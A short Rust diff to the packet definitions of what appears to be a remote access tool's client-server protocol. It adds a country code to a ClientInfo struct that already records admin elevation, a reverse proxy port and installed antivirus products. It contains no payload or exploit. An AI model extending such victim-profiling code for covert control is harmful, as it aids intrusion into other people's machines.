@@ -1,7 +1,7 @@
 use rmp_serde::{Deserializer, Serializer};
 use serde::{Deserialize, Serialize};
 
-#[derive(Debug, PartialEq, Eq, Clone, Deserialize, Serialize)]
+#[derive(Debug, PartialEq, Clone, Deserialize, Serialize)]
 pub struct ClientInfo {
     pub uuidv4: Option<String>,
     pub addr: Option<String>,
@@ -18,6 +18,7 @@ pub struct ClientInfo {
     pub is_elevated: bool,
     pub reverse_proxy_port: String,
     pub installed_avs: Vec<String>,
+    pub country_code: String,
 }
 
 pub trait Packet {
@@ -29,7 +30,7 @@ pub trait Packet {
 }
 
 /// Packets going from client to the server.
-#[derive(Debug, PartialEq, Eq, Serialize, Deserialize, Clone)]
+#[derive(Debug, PartialEq, Serialize, Deserialize, Clone)]
 pub enum ServerboundPacket {
     EncryptionRequest,
     EncryptionConfirm(Vec<u8>, Vec<u8>), // encrypted secret and token
